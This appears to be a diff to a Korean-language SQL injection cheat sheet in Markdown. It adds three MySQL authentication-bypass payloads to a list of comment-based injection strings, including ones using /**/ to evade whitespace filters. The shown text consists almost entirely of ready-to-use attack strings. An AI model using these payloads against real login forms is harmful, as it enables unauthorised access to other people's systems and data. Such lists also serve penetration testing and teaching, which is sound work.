@@ -24,6 +24,9 @@ admin'-- -      # MySQL 표준 주석 (공백 필요)
 admin';-- -     # 세미콜론 포함 버전
 admin'#         # MySQL 대체 주석
 admin')-- -     # 괄호가 있는 경우
+admin')#
+admin')/**/or/**/1=1;#  # 공백 필터링
+admin')/**/or/**/1=1;-- -
 ```
 
 ### 인증 우회 (Authentication Bypass)
